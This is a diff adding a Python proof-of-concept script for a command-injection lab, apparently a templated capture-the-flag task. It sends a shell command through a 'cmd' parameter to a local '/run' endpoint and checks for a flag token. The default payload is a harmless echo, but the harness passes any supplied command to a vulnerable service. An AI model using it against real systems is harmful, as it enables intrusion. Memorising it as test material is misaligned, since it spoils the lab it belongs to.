@@ -1,0 +1,37 @@
+import argparse
+import sys
+import requests
+
+SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
+FLAG_TOKEN = '__FLAG_TOKEN__'
+DEFAULT_PAYLOAD = 'echo FLAG{CMDI_OK}'
+
+def exploit(base_url: str, payload: str) -> bool:
+    url = base_url.rstrip('/') + '/run'
+    try:
+        resp = requests.get(url, params={'cmd': payload}, timeout=5)
+        resp.raise_for_status()
+    except requests.RequestException as exc:
+        print(f'[cmdi-compiler] request failed: {exc}', file=sys.stderr)
+        return False
+    try:
+        payload = resp.json()
+    except ValueError:
+        return False
+    output = str(payload.get('output') or '')
+    return str(payload.get('ok')) == 'True' and FLAG_TOKEN in output
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='Command Injection compiler PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)
+    args = parser.parse_args()
+    if exploit(args.base_url, args.payload):
+        print(SUCCESS_SIGNATURE)
+        print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[cmdi-compiler] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+if __name__ == '__main__':
+    main()
